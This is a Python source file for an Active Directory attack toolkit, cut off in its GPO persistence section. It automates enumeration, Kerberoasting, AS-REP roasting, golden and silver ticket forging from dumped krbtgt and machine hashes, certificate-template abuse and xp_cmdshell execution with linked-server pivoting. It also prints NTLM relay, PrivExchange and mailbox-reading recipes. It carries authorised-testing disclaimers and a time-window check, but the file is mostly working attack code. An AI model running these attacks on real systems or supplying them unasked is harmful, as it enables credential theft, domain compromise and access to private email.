#!/usr/bin/env python3
"""
╔═══════════════════════════════════════════════════════════════════════════════╗
║                    RED OFFENSIVE TEAM 05 - SWISS ARMY KNIFE                    ║
║                         Ultimate AD Pentesting Toolkit                         ║
╚═══════════════════════════════════════════════════════════════════════════════╝

Complete Enterprise Attack Suite:
  • AD/Kerberos Attacks (Kerberoasting, AS-REP, Golden/Silver Tickets)
  • AD CS (ESC1-ESC8 Certificate Attacks)
  • Exchange Server (PrivExchange, ProxyLogon, EWS)
  • SQL Server (Linked Servers, CLR, xp_cmdshell)
  • GPO Lateral Movement & Persistence
  • DPAPI Backup Key & Secret Extraction
  • BloodHound Integration
  • LLMNR/NBT-NS Poisoning (Responder)
  • SMB Relay & mitm6
  • CVE Scanner & Exploit Suggester
  • Checkpoint/Resume, Rate Limiting, Compliance Window

Intended for AUTHORIZED penetration testing and CTF use only.
"""

import argparse
import cmd
import os
import sys
import subprocess
import shutil
import datetime
import time
import logging
import json
import hashlib
import re
import socket
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field
from enum import Enum, IntEnum
from getpass import getpass
from pathlib import Path
from typing import Dict, List, Optional, Tuple

# ──────────────────────────────────────────────────────────────────────────────
# COLOURS
# ──────────────────────────────────────────────────────────────────────────────

try:
    from colorama import Fore, Style, init as _cinit
    _cinit(autoreset=True)
    R   = Fore.RED
    G   = Fore.GREEN
    Y   = Fore.YELLOW
    B   = Fore.CYAN
    M   = Fore.MAGENTA
    W   = Fore.WHITE
    RST = Style.RESET_ALL
except ImportError:
    R = G = Y = B = M = W = RST = ""

def _banner_box(text: str) -> None:
    print(f"\n{B}{'='*60}{RST}")
    print(f"{B}  {text}{RST}")
    print(f"{B}{'='*60}{RST}\n")

def main_banner():
    print(f"""{R}
╔═══════════════════════════════════════════════════════════════════════════════╗
║{W}                    RED OFFENSIVE TEAM 05 - SWISS ARMY KNIFE                    {R}║
║{B}                         Ultimate AD Pentesting Toolkit                         {R}║
╚═══════════════════════════════════════════════════════════════════════════════╝{RST}
""")

def info(msg):    print(f"{G}[+]{RST} {msg}")
def warn(msg):    print(f"{Y}[!]{RST} {msg}")
def err(msg):     print(f"{R}[-]{RST} {msg}")
def step(msg):    print(f"{B}[*]{RST} {msg}")
def success(msg): print(f"{G}[✓]{RST} {msg}")
def debug(msg):   print(f"{M}[D]{RST} {msg}")
def title(msg):   _banner_box(msg)

# ──────────────────────────────────────────────────────────────────────────────
# LOGGING  — FIX: deferred to main() so LOG_FILE lives inside output_dir
# ──────────────────────────────────────────────────────────────────────────────

logger = logging.getLogger("rot05")

def setup_logging(output_dir: Path) -> None:
    """Initialise file-only logger after output_dir is known."""
    log_file = output_dir / "rot05.log"
    output_dir.mkdir(parents=True, exist_ok=True)
    handler = logging.FileHandler(log_file)
    handler.setFormatter(logging.Formatter("%(asctime)s %(levelname)s %(message)s"))
    logger.addHandler(handler)
    logger.setLevel(logging.INFO)
    # FIX: no StreamHandler — coloured print functions handle terminal output

# ──────────────────────────────────────────────────────────────────────────────
# PHASE CHECKPOINT MANAGER
# ──────────────────────────────────────────────────────────────────────────────

class PhaseStatus(Enum):
    PENDING   = "pending"
    RUNNING   = "running"
    COMPLETED = "completed"
    FAILED    = "failed"
    SKIPPED   = "skipped"

@dataclass
class PhaseCheckpoint:
    name:        str
    status:      PhaseStatus
    timestamp:   str
    output_size: int
    error:       Optional[str] = None

# ──────────────────────────────────────────────────────────────────────────────
# EXIT CODES  (recommendation 6)
# ──────────────────────────────────────────────────────────────────────────────

class ExitCode(IntEnum):
    SUCCESS          = 0   # all phases completed cleanly
    GENERAL_ERROR    = 1   # unhandled exception
    COMPLIANCE_FAIL  = 2   # outside authorised time window
    MISSING_TARGET   = 3   # -t not supplied in non-interactive mode
    CONFIG_ERROR     = 4   # bad/missing config file
    ENCRYPT_ERROR    = 5   # encryption setup failed

class CheckpointManager:
    def __init__(self, output_dir: Path):
        self.output_dir      = output_dir
        self.checkpoint_file = output_dir / ".checkpoints.json"
        self.checkpoints: Dict[str, PhaseCheckpoint] = {}
        self._load()

    def _load(self):
        if not self.checkpoint_file.exists():
            return
        try:
            data = json.loads(self.checkpoint_file.read_text())
            for name, d in data.items():
                self.checkpoints[name] = PhaseCheckpoint(
                    name=d["name"],
                    status=PhaseStatus(d["status"]),
                    timestamp=d["timestamp"],
                    output_size=d["output_size"],
                    error=d.get("error"),
                )
            logger.info("Loaded %d checkpoints", len(self.checkpoints))
        except Exception as exc:
            warn(f"Could not load checkpoints: {exc}")

    def _save(self):
        try:
            data = {
                n: {"name": c.name, "status": c.status.value,
                    "timestamp": c.timestamp, "output_size": c.output_size,
                    "error": c.error}
                for n, c in self.checkpoints.items()
            }
            self.checkpoint_file.write_text(json.dumps(data, indent=2))
        except Exception as exc:
            warn(f"Could not save checkpoints: {exc}")

    def _phase_output_size(self, phase_name: str) -> int:
        phase_dir = self.output_dir / phase_name
        if not phase_dir.exists():
            return 0
        return sum(f.stat().st_size for f in phase_dir.rglob("*") if f.is_file())

    def update(self, name: str, status: PhaseStatus, error: Optional[str] = None):
        self.checkpoints[name] = PhaseCheckpoint(
            name=name, status=status,
            timestamp=datetime.datetime.now().isoformat(),
            output_size=self._phase_output_size(name),
            error=error,
        )
        self._save()

    def is_done(self, name: str) -> bool:
        cp = self.checkpoints.get(name)
        return cp is not None and cp.status == PhaseStatus.COMPLETED

    def should_skip(self, name: str, force: bool = False) -> bool:
        return (not force) and self.is_done(name)

# ──────────────────────────────────────────────────────────────────────────────
# CONFIG FILE  (recommendation 1)
# ──────────────────────────────────────────────────────────────────────────────

class ConfigFile:
    """Persistent JSON config — passwords and hashes are never persisted."""
    _SAFE_KEYS = frozenset({
        "ip", "domain", "username", "ca_server",
        "exchange_server", "sql_server", "interface",
    })

    def __init__(self, path: Path):
        self.path = path

    def _load_raw(self) -> Dict:
        if not self.path.exists():
            return {}
        try:
            return json.loads(self.path.read_text())
        except Exception as exc:
            warn(f"Config file read error: {exc}")
            return {}

    def apply(self, cfg: "TargetConfig") -> None:
        """Populate cfg from file; CLI args applied afterwards will override."""
        for k, v in self._load_raw().items():
            if k in self._SAFE_KEYS and hasattr(cfg, k):
                setattr(cfg, k, v)

    def save(self, cfg: "TargetConfig") -> None:
        """Persist safe fields only — never passwords or hashes."""
        data = {k: getattr(cfg, k, "") for k in sorted(self._SAFE_KEYS)
                if getattr(cfg, k, "")}
        try:
            self.path.parent.mkdir(parents=True, exist_ok=True)
            self.path.write_text(json.dumps(data, indent=2))
            success(f"Config saved → {self.path}")
        except Exception as exc:
            err(f"Failed to save config: {exc}")
            sys.exit(ExitCode.CONFIG_ERROR)

# ──────────────────────────────────────────────────────────────────────────────
# RESULT ENCRYPTOR  (recommendation 2)
# ──────────────────────────────────────────────────────────────────────────────

class ResultEncryptor:
    """Fernet symmetric encryption for sensitive output directories.

    Key is derived via PBKDF2-HMAC-SHA256 from a user passphrase so
    the raw key is never stored on disk.
    """
    SENSITIVE_DIRS = frozenset({"kerberoast", "asrep", "secrets", "dpapi"})

    def __init__(self, passphrase: str, output_dir: Path):
        try:
            import base64
            from cryptography.fernet import Fernet
            from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
            from cryptography.hazmat.primitives import hashes as _ch
        except ImportError:
            err("cryptography not installed — run: pip install cryptography>=41.0.0")
            sys.exit(ExitCode.ENCRYPT_ERROR)

        salt_file = output_dir / ".salt"
        if salt_file.exists():
            salt = salt_file.read_bytes()
        else:
            salt = os.urandom(16)
            output_dir.mkdir(parents=True, exist_ok=True)
            salt_file.write_bytes(salt)

        kdf = PBKDF2HMAC(
            algorithm=_ch.SHA256(),
            length=32,
            salt=salt,
            iterations=480_000,
        )
        key = base64.urlsafe_b64encode(kdf.derive(passphrase.encode()))
        self._fernet = Fernet(key)

    def encrypt_dir(self, path: Path) -> int:
        """Encrypt .txt/.json files in place; returns count encrypted."""
        if not path.exists():
            return 0
        count = 0
        for f in sorted(path.rglob("*")):
            if f.is_file() and f.suffix in {".txt", ".json"} \
                    and not f.name.endswith(".enc"):
                enc_path = f.with_name(f.name + ".enc")
                enc_path.write_bytes(self._fernet.encrypt(f.read_bytes()))
                f.unlink()
                count += 1
        return count

    def encrypt_sensitive(self, output_dir: Path) -> None:
        total = 0
        for d in sorted(self.SENSITIVE_DIRS):
            n = self.encrypt_dir(output_dir / d)
            if n:
                success(f"Encrypted {n} file(s) in {d}/")
                total += n
        (success if total else info)(f"Encryption complete — {total} file(s) secured")

# ──────────────────────────────────────────────────────────────────────────────
# RATE LIMITER  — FIX: removed dead elif branch
# ──────────────────────────────────────────────────────────────────────────────

class RateLimiter:
    def __init__(self, min_delay: float = 0.5):
        self.min_delay = min_delay
        self._last = 0.0

    def wait(self):
        elapsed = time.time() - self._last
        if elapsed < self.min_delay:
            time.sleep(self.min_delay - elapsed)
        self._last = time.time()

_rate = RateLimiter(min_delay=0.5)

# ──────────────────────────────────────────────────────────────────────────────
# COMPLIANCE CHECKER  — FIX: wired into main()
# ──────────────────────────────────────────────────────────────────────────────

class ComplianceChecker:
    def __init__(self, start_hour: int = 8, end_hour: int = 18,
                 business_days_only: bool = False):
        self.start_hour        = start_hour
        self.end_hour          = end_hour
        self.business_days_only = business_days_only

    def check(self) -> Tuple[bool, str]:
        now = datetime.datetime.now()
        if self.business_days_only and now.weekday() >= 5:
            return False, f"Weekend ({now.strftime('%A')}) — tests may disrupt operations"
        if not (self.start_hour <= now.hour < self.end_hour):
            return False, f"Outside authorised window ({self.start_hour:02d}:00–{self.end_hour:02d}:00)"
        return True, f"Within window ({now.strftime('%H:%M')})"

    @staticmethod
    def flag_intrusive(phases: List[str]) -> List[str]:
        intrusive = {"responder", "relay", "secretsdump", "golden", "mitm6"}
        flagged   = [p for p in phases if p in intrusive]
        if flagged:
            warn(f"Intrusive phases: {', '.join(flagged)} — may trigger alerts")
        return flagged

# ──────────────────────────────────────────────────────────────────────────────
# TARGET CONFIGURATION
# ──────────────────────────────────────────────────────────────────────────────

@dataclass
class TargetConfig:
    ip:              str  = ""
    domain:          str  = ""
    username:        str  = ""
    password:        str  = ""
    ntlm_hash:       str  = ""
    ca_server:       str  = ""
    exchange_server: str  = ""
    sql_server:      str  = ""
    output_dir:      Path = Path("rot05_output")
    interface:       str  = "eth0"
    userlist:        Path = Path("userlist.txt")

    def has_creds(self) -> bool:
        return bool(self.username and (self.password or self.ntlm_hash))

    def cred_str(self) -> str:
        if self.ntlm_hash:
            return f"{self.domain}/{self.username}@{self.ip} -hashes :{self.ntlm_hash}"
        return f"{self.domain}/{self.username}:{self.password}@{self.ip}"

config = TargetConfig()

# ──────────────────────────────────────────────────────────────────────────────
# UTILITIES
# ──────────────────────────────────────────────────────────────────────────────

OUTPUT_DIR: Path = Path("rot05_output")
DRY_RUN:    bool = False                  # set by --dry-run (recommendation 3)

def ensure_dir(subdir: str = "") -> Path:
    d = OUTPUT_DIR / subdir if subdir else OUTPUT_DIR
    d.mkdir(parents=True, exist_ok=True)
    return d

def tool_exists(name: str) -> bool:
    return shutil.which(name) is not None

def require_tool(name: str) -> bool:
    if not tool_exists(name):
        warn(f"'{name}' not found in PATH — skipping.")
        logger.warning("Tool missing: %s", name)
        return False
    return True

# FIX: interactive flag prevents blocking automated runs
def install_tool(name: str, install_cmd: str, interactive: bool = True) -> bool:
    if tool_exists(name):
        return True
    if not interactive:
        warn(f"'{name}' not installed and interactive install is disabled.")
        return False
    if input(f"Install {name}? [y/N] ").lower() != "y":
        return False
    try:
        subprocess.run(install_cmd, shell=True, check=True, timeout=120)
        return tool_exists(name)
    except Exception as exc:
        err(f"Failed to install {name}: {exc}")
        return False

# FIX: credential redaction so passwords don't appear in log files
_REDACT_FLAGS = {"-w", "-p", "--password", "-P", "--pass"}

def _redact(cmd: List[str]) -> str:
    out, skip = [], False
    for tok in cmd:
        if skip:
            out.append("***")
            skip = False
        elif tok in _REDACT_FLAGS:
            out.append(tok)
            skip = True
        else:
            out.append(tok)
    return " ".join(out)

def run(cmd: List[str], outfile: Optional[Path] = None,
        timeout: int = 300, shell: bool = False) -> Tuple[str, int]:
    """
    Execute a command (list = shell=False, str = shell=True).
    Returns (stdout+stderr, returncode).
    """
    _rate.wait()
    cmd_log = _redact(cmd) if isinstance(cmd, list) else cmd
    step(f"Running: {cmd_log}")
    logger.info("CMD: %s", cmd_log)
    if DRY_RUN:
        info(f"[DRY-RUN] Would execute: {cmd_log}")
        return "", 0
    try:
        result = subprocess.run(
            cmd, shell=shell, capture_output=True, text=True, timeout=timeout
        )
        output = (result.stdout or "") + (result.stderr or "")
        if outfile:
            outfile.parent.mkdir(parents=True, exist_ok=True)
            outfile.write_text(output)
            info(f"Saved → {outfile}")
        if result.returncode != 0:
            logger.warning("Return code %d: %s", result.returncode, cmd_log)
        return output, result.returncode
    except subprocess.TimeoutExpired:
        warn(f"Timed out ({timeout}s): {cmd_log}")
        return "", -1
    except Exception as exc:
        err(f"Failed ({exc}): {cmd_log}")
        return "", -2

def run_s(cmd: List[str], outfile: Optional[Path] = None, **kw) -> str:
    """run() wrapper that returns output only."""
    output, _ = run(cmd, outfile, **kw)
    return output

def extract_ports(nmap_file: Path) -> str:
    if not nmap_file.exists():
        return ""
    ports = []
    for line in nmap_file.read_text().splitlines():
        if "/tcp" in line and "open" in line:
            ports.append(line.split("/")[0].strip())
    return ",".join(ports)

def calculate_file_hash(path: Path) -> str:
    if not path.exists():
        return ""
    h = hashlib.sha256()
    with path.open("rb") as f:
        for chunk in iter(lambda: f.read(4096), b""):
            h.update(chunk)
    return h.hexdigest()

def is_port_open(ip: str, port: int) -> bool:
    try:
        s = socket.socket()
        s.settimeout(2)
        result = s.connect_ex((ip, port))
        s.close()
        return result == 0
    except Exception:
        return False

def detect_services(ip: str) -> Dict[str, bool]:
    svcs = {}
    for name, ports in {"DC": [88, 389, 445], "SQL": [1433], "RDP": [3389], "WinRM": [5985, 5986]}.items():
        svcs[name] = any(is_port_open(ip, p) for p in ports)
    # Exchange: require OWA header, not just port 443
    if is_port_open(ip, 443):
        out, _ = run(["curl", "-k", "-s", "-I", f"https://{ip}/owa/", "--max-time", "5"])
        svcs["Exchange"] = any(h in out for h in ("X-OWA-Version", "X-FEServer"))
    else:
        svcs["Exchange"] = False
    return svcs

# ──────────────────────────────────────────────────────────────────────────────
# PHASE WRAPPER  — handles checkpoint + error boundary consistently
# ──────────────────────────────────────────────────────────────────────────────

def _phase(name: str, fn, ckpt: Optional[CheckpointManager], force: bool):
    """Checkpoint-aware phase runner. Calls fn() if not already done."""
    if ckpt and ckpt.should_skip(name, force):
        info(f"Phase '{name}' already completed — use --force-rerun to redo.")
        return
    if ckpt:
        ckpt.update(name, PhaseStatus.RUNNING)
    try:
        fn()
        if ckpt:
            ckpt.update(name, PhaseStatus.COMPLETED)
    except Exception as exc:
        err(f"Phase '{name}' failed: {exc}")
        logger.error("Phase %s error", name, exc_info=True)
        if ckpt:
            ckpt.update(name, PhaseStatus.FAILED, str(exc))

# ──────────────────────────────────────────────────────────────────────────────
# MODULE: AD ENUMERATION
# ──────────────────────────────────────────────────────────────────────────────

class ADEnum:
    @staticmethod
    def nmap(ip: str):
        title("Phase – NMAP Enumeration")
        if not require_tool("nmap"):
            return
        out = ensure_dir("nmap")

        run(["nmap", "-Pn", "-p-", ip, "-vv", "-oA", str(out / "all-ports"),
             "--min-rate", "2000"], outfile=out / "all-ports.log", timeout=600)

        ports = extract_ports(out / "all-ports.nmap")
        if not ports:
            warn("Port parse failed; using common DC ports.")
            ports = "53,88,135,139,389,445,464,593,636,3268,3269,3389"
        info(f"Open ports: {ports}")

        run(["nmap", "-Pn", "-sC", "-sV", "-p", ports, ip,
             "--script=vuln", "-vv", "-oA", str(out / "services")],
            outfile=out / "services.log", timeout=900)

        run(["nmap", "-Pn", "--script", "smb-enum*,smb-vuln*",
             "-p", "139,445", ip, "-oA", str(out / "smb-scripts")],
            outfile=out / "smb-scripts.log", timeout=600)

    @staticmethod
    def ldap():
        title("Phase – LDAP Enumeration")
        if not require_tool("ldapsearch"):
            return
        out    = ensure_dir("ldap")
        base   = "dc=" + config.domain.replace(".", ",dc=") if config.domain else "dc=htb,dc=local"
        ip     = config.ip

        run(["ldapsearch", "-x", "-H", f"ldap://{ip}", "-s", "base", "namingcontexts"],
            outfile=out / "naming-contexts.txt")
        run(["ldapsearch", "-x", "-b", base, "-H", f"ldap://{ip}", "-p", "389"],
            outfile=out / "anon-base-dump.txt")
        run(["ldapsearch", "-x", "-b", base, "-H", f"ldap://{ip}", "-p", "389",
             "(ObjectClass=User)", "sAMAccountName"],
            outfile=out / "users-samaccountnames.txt")

        if config.has_creds():
            run(["ldapsearch", "-H", f"ldap://{ip}", "-x",
                 "-D", f"{config.username}@{config.domain}",
                 "-w", config.password, "-b", base, "objectclass=user", "sAMAccountName"],
                outfile=out / "auth-users.txt")

    @staticmethod
    def smb():
        title("Phase – SMB Enumeration")
        out = ensure_dir("smb")
        ip  = config.ip

        if require_tool("smbmap"):
            run(["smbmap", "-H", ip], outfile=out / "smbmap-anon.txt")
            if config.has_creds():
                cmd = ["smbmap", "-H", ip, "-u", config.username, "-p", config.password]
                if config.domain:
                    cmd += ["-d", config.domain]
                run(cmd, outfile=out / "smbmap-auth.txt")

        if require_tool("smbclient"):
            run(["smbclient", "-L", ip, "-N"], outfile=out / "smbclient-list.txt")

        if require_tool("nmap"):
            run(["nmap", "--script=smb2-security-mode.nse", "-p", "445", ip],
                outfile=out / "smb-signing.txt")

        if require_tool("enum4linux"):
            cmd = ["enum4linux"]
            if config.has_creds():
                cmd += ["-u", config.username, "-p", config.password]
            run(cmd + ["-a", ip], outfile=out / "enum4linux.txt")

    @staticmethod
    # FIX: credential args as proper list elements, not a shell string
    def rpc():
        title("Phase – RPC / rpcclient Enumeration")
        if not require_tool("rpcclient"):
            return
        out = ensure_dir("rpc")

        if config.has_creds():
            cred_args = [f"-U={config.username}%{config.password}"]
        else:
            cred_args = ["-U=", "-N"]

        cmds = "srvinfo; enumdomusers; enumdomains; enumdomaingroups; querydispinfo; netshareenum; enumprivs"
        run(["rpcclient"] + cred_args + [config.ip, "-c", cmds],
            outfile=out / "rpc-enum.txt")

    @staticmethod
    def windapsearch():
        title("Phase – windapsearch")
        script = shutil.which("windapsearch") or shutil.which("windapsearch.py")
        if not script:
            warn("windapsearch not found — skipping.")
            return
        out = ensure_dir("windapsearch")

        auth = ["-u", f"{config.domain}\\{config.username}", "-p", config.password] \
               if config.has_creds() else []

        run(["python3", script, "-d", config.domain, "--dc-ip", config.ip] + auth + ["-U"],
            outfile=out / "users.txt")
        if config.has_creds():
            run(["python3", script, "-d", config.domain, "--dc-ip", config.ip] + auth + ["-G"],
                outfile=out / "groups.txt")
            run(["python3", script, "-d", config.domain, "--dc-ip", config.ip] + auth +
                ["--unconstrained-computers"], outfile=out / "unconstrained-computers.txt")

# ──────────────────────────────────────────────────────────────────────────────
# MODULE: KERBEROS ATTACKS
# ──────────────────────────────────────────────────────────────────────────────

class KerberosAttacks:
    @staticmethod
    def kerberoast():
        title("Kerberoasting")
        if not config.has_creds():
            err("Credentials required")
            return
        out_file = ensure_dir("kerberoast") / "hashes.txt"
        script   = shutil.which("impacket-GetUserSPNs") or shutil.which("GetUserSPNs.py")
        if not script:
            warn("GetUserSPNs not found — skipping.")
            return
        _, stdout, _ = (None, *run(
            [script, f"{config.domain}/{config.username}:{config.password}",
             "-dc-ip", config.ip, "-request"]))
        if "krb5tgs" in stdout:
            out_file.write_text(stdout)
            success(f"Hashes → {out_file}")
            info("Crack: hashcat -m 13100 hashes.txt rockyou.txt")
        else:
            warn("No Kerberoastable accounts found")

    @staticmethod
    def asreproast():
        title("AS-REP Roasting")
        out_file  = ensure_dir("asrep") / "hashes.txt"
        script    = shutil.which("impacket-GetNPUsers") or shutil.which("GetNPUsers.py")
        if not script:
            warn("GetNPUsers not found — skipping.")
            return
        users_file = OUTPUT_DIR / "ldap" / "users.txt"
        if users_file.exists() and users_file.stat().st_size > 0:
            cmd = [script, f"{config.domain}/", "-usersfile", str(users_file),
                   "-dc-ip", config.ip, "-request", "-format", "john"]
        else:
            cmd = [script, f"{config.domain}/", "-dc-ip", config.ip,
                   "-request", "-format", "john"]
        stdout = run_s(cmd)
        if "$krb5asrep" in stdout:
            out_file.write_text(stdout)
            success(f"Hashes → {out_file}")
            info("Crack: hashcat -m 18200 hashes.txt rockyou.txt")

    @staticmethod
    def golden_ticket():
        title("Golden Ticket Creation")
        out_dir = ensure_dir("tickets")
        script  = shutil.which("impacket-lookupsid") or shutil.which("lookupsid.py")
        if not script:
            warn("lookupsid not found — skipping.")
            return

        stdout = run_s([script, f"{config.domain}/{config.username}:{config.password}@{config.ip}"])
        sid    = re.search(r"S-1-5-21-\d+-\d+-\d+", stdout)
        if not sid:
            err("Domain SID not found")
            return
        domain_sid = sid.group(0)
        success(f"Domain SID: {domain_sid}")

        if not config.ntlm_hash:
            sd_script = shutil.which("impacket-secretsdump") or shutil.which("secretsdump.py")
            if sd_script:
                stdout = run_s([sd_script,
                                f"{config.domain}/{config.username}:{config.password}@{config.ip}",
                                "-just-dc-user", "krbtgt"])
                m = re.search(r"krbtgt:\d+:[a-f0-9]{32}:([a-f0-9]{32})", stdout, re.I)
                if m:
                    config.ntlm_hash = m.group(1)

        if not config.ntlm_hash:
            err("KRBTGT hash not available — provide via -H")
            return

        ticketer = shutil.which("impacket-ticketer") or shutil.which("ticketer.py")
        if ticketer:
            stdout = run_s([ticketer, "-domain", config.domain, "-domain-sid", domain_sid,
                            "-nthash", config.ntlm_hash, "-user-id", "500", "Administrator"])
            (out_dir / "golden_ticket.log").write_text(stdout)
            success(f"Golden ticket log → {out_dir}/golden_ticket.log")
        print(f"\n{Y}Usage:{RST}\n"
              f"  export KRB5CCNAME={out_dir}/Administrator.ccache\n"
              f"  impacket-psexec -k {config.domain}/Administrator@{config.ip}\n")

    @staticmethod
    def silver_ticket(spn: str):
        title(f"Silver Ticket — {spn}")
        out_dir    = ensure_dir("tickets")
        sid_script = shutil.which("impacket-lookupsid") or shutil.which("lookupsid.py")
        sd_script  = shutil.which("impacket-secretsdump") or shutil.which("secretsdump.py")
        ticketer   = shutil.which("impacket-ticketer") or shutil.which("ticketer.py")
        if not all([sid_script, sd_script, ticketer]):
            warn("Required impacket tools not found — skipping.")
            return

        stdout     = run_s([sid_script, f"{config.domain}/{config.username}:{config.password}@{config.ip}"])
        sid        = re.search(r"S-1-5-21-\d+-\d+-\d+", stdout)
        if not sid:
            err("Domain SID not found")
            return

        target = spn.split("/")[1] if "/" in spn else spn
        stdout = run_s([sd_script,
                        f"{config.domain}/{config.username}:{config.password}@{config.ip}",
                        "-just-dc-user", f"{target}$"])
        m = re.search(rf"{re.escape(target)}\$:\d+:[a-f0-9]{{32}}:([a-f0-9]{{32}})", stdout, re.I)
        if not m:
            err(f"Machine hash for {target}$ not found")
            return

        stdout = run_s([ticketer, "-domain", config.domain, "-domain-sid", sid.group(0),
                        "-spn", spn, "-nthash", m.group(1), "Administrator"])
        (out_dir / f"silver_{target}.log").write_text(stdout)
        success(f"Silver ticket log → {out_dir}/silver_{target}.log")

# ──────────────────────────────────────────────────────────────────────────────
# MODULE: AD CS
# ──────────────────────────────────────────────────────────────────────────────

class ADCSAttacks:
    @staticmethod
    def enumerate_ca():
        title("AD CS — Certificate Authority Enumeration")
        if not config.has_creds():
            err("Credentials required")
            return
        if not require_tool("certipy"):
            return
        out_dir = ensure_dir("adcs")
        stdout  = run_s(["certipy", "find",
                         "-u", f"{config.username}@{config.domain}",
                         "-p", config.password, "-dc-ip", config.ip, "-stdout"])
        (out_dir / "ca_discovery.txt").write_text(stdout)
        if "VULNERABLE" in stdout:
            success("Vulnerable templates found!")
            for line in stdout.splitlines():
                if "Template Name" in line or "ESC" in line:
                    print(f"  {Y}{line.strip()}{RST}")

    @staticmethod
    def esc1_attack(template: str, ca_name: str, target_user: str = "Administrator"):
        title(f"ESC1 Attack — {template}")
        if not require_tool("certipy"):
            return
        out_dir = ensure_dir("adcs/esc1")
        stdout  = run_s(["certipy", "req",
                         "-u", f"{config.username}@{config.domain}", "-p", config.password,
                         "-ca", ca_name, "-template", template,
                         "-alt", target_user, "-dc-ip", config.ip])
        (out_dir / "cert_request.txt").write_text(stdout)
        for pfx in Path(".").glob("*.pfx"):
            stdout = run_s(["certipy", "auth", "-pfx", str(pfx), "-dc-ip", config.ip])
            (out_dir / "auth_result.txt").write_text(stdout)
            m = re.search(r"NT HASH:\s*([a-f0-9]{32})", stdout, re.I)
            if m:
                success(f"Hash: {m.group(1)}")
            break

    @staticmethod
    def esc8_relay():
        title("ESC8 — NTLM Relay to ADCS")
        print(f"""
{Y}Terminal 1 – Responder (SMB/HTTP off):{RST}
  sudo sed -i 's/SMB = On/SMB = Off/; s/HTTP = On/HTTP = Off/' /etc/responder/Responder.conf
  sudo responder -I {config.interface} -rdwv

{Y}Terminal 2 – Relay to ADCS:{RST}
  sudo impacket-ntlmrelayx -t http://{config.ca_server}/certsrv/certfnsh.asp -smb2support --adcs
""")

# ──────────────────────────────────────────────────────────────────────────────
# MODULE: EXCHANGE
# ──────────────────────────────────────────────────────────────────────────────

class ExchangeAttacks:
    @staticmethod
    def detect_version():
        title("Exchange — Version Detection")
        host    = config.exchange_server or config.ip
        out_dir = ensure_dir("exchange")
        stdout  = run_s(["curl", "-k", "-s", "-I", f"https://{host}/owa/", "--max-time", "10"])
        (out_dir / "version.txt").write_text(stdout)
        for ver, label in [("15.0", "2013"), ("15.1", "2016"), ("15.2", "2019")]:
            if ver in stdout:
                warn(f"Exchange {label} detected")

    @staticmethod
    def privesc():
        title("PrivExchange (CVE-2019-1040)")
        if not config.has_creds():
            err("Credentials required")
            return
        host        = config.exchange_server or config.ip
        attacker_ip = input("Attacker IP for relay listener: ").strip()
        print(f"""
{Y}1. Start relay:{RST}  sudo impacket-ntlmrelayx -t ldap://{config.ip} -escalate-user
{Y}2. Trigger:{RST}      python3 privexchange.py -ah {attacker_ip} -u {config.username} \\
                   -d {config.domain} -p '{config.password}' {host}
""")

    @staticmethod
    def ews_abuse():
        title("Exchange Web Services (EWS)")
        if not config.has_creds():
            err("Credentials required")
            return
        host = config.exchange_server or config.ip
        print(f"""
{Y}EWS Python snippet:{RST}
  from exchangelib import Account, Credentials, Configuration
  cfg = Configuration(service_endpoint='https://{host}/ews/Exchange.asmx')
  acc = Account('{config.username}@{config.domain}',
                credentials=Credentials('{config.username}@{config.domain}', '{config.password}'),
                autodiscover=False, config=cfg)
  for m in acc.inbox.all()[:50]:
      print(m.sender, m.subject)
""")

# ──────────────────────────────────────────────────────────────────────────────
# MODULE: SQL SERVER
# ──────────────────────────────────────────────────────────────────────────────

class SQLAttacks:
    @staticmethod
    def enumerate():
        title("SQL Server — Enumeration")
        host = config.sql_server or config.ip
        if not is_port_open(host, 1433):
            warn(f"Port 1433 not open on {host}")
            return
        out_dir = ensure_dir("sql/enum")
        if not config.has_creds():
            return
        for label, query in [
            ("version",        "SELECT @@VERSION, SYSTEM_USER, IS_SRVROLEMEMBER('sysadmin')"),
            ("linked_servers", "SELECT * FROM sys.servers WHERE is_linked = 1"),
            ("xp_cmdshell",    "EXEC sp_configure 'xp_cmdshell'"),
        ]:
            stdout = run_s(["sqsh", "-S", host,
                            "-U", config.username, "-P", config.password,
                            "-Q", query])
            (out_dir / f"{label}.txt").write_text(stdout)

    @staticmethod
    def xp_cmdshell(command: str):
        title("SQL — xp_cmdshell")
        if not config.has_creds():
            err("Credentials required")
            return
        host = config.sql_server or config.ip
        enable_q = ("EXEC sp_configure 'show advanced options',1; RECONFIGURE; "
                    "EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;")
        run(["sqsh", "-S", host, "-U", config.username, "-P", config.password, "-Q", enable_q])
        stdout = run_s(["sqsh", "-S", host, "-U", config.username, "-P", config.password,
                        "-Q", f"EXEC xp_cmdshell '{command}'"])
        print(stdout)
        (ensure_dir("sql") / "cmd_output.txt").write_text(stdout)

    @staticmethod
    def linked_server_pivot(linked: str):
        title(f"SQL — Linked Server Pivot: {linked}")
        host    = config.sql_server or config.ip
        out_dir = ensure_dir("sql/pivot")
        q       = f"SELECT * FROM OPENQUERY([{linked}], 'SELECT @@SERVERNAME, SYSTEM_USER')"
        stdout  = run_s(["sqsh", "-S", host, "-U", config.username, "-P", config.password, "-Q", q])
        (out_dir / f"{linked}_info.txt").write_text(stdout)
        run(["sqsh", "-S", host, "-U", config.username, "-P", config.password,
             "-Q", f"EXEC sp_serveroption '{linked}', 'rpc out', 'true'"])
        info(f"Execute on {linked}: EXECUTE ('EXEC xp_cmdshell ''whoami''') AT [{linked}]")

# ──────────────────────────────────────────────────────────────────────────────
# MODULE: GPO
# ──────────────────────────────────────────────────────────────────────────────

class GPOAttacks:
    @staticmethod
    def find_cpassword():
        title("GPO — cPassword Hunt")
        if not config.has_creds():
            err("Credentials required")
            return
        out_file = ensure_dir("gpo") / "cpassword_results.txt"
        if not require_tool("smbclient"):
            return
        stdout = run_s(["smbclient", f"//{config.ip}/SYSVOL",
                        "-U", f"{config.domain}\\{config.username}%{config.password}",
                        "-c", "mask *Groups.xml; recurse; ls"])
        out_file.write_text(stdout)
        if "cpassword" in stdout.lower():
            success("cPassword found in SYSVOL!")
            for line in stdout.splitlines():
                if "cpassword" in line.lower():
                    print(f"  {Y}{line}{RST}")
            info("Decrypt: gpp-decrypt <hash>")
        else:
            warn("No cPassword found")

    @staticmethod
    def malicious_gpo():
        title("GPO — Persistence Techniques")
        print(f"""
{Y}Scheduled task via GPO:{RST}
